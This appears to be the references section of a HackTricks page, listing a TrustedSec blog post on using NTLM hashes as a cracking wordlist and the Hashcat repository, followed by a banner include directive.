- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
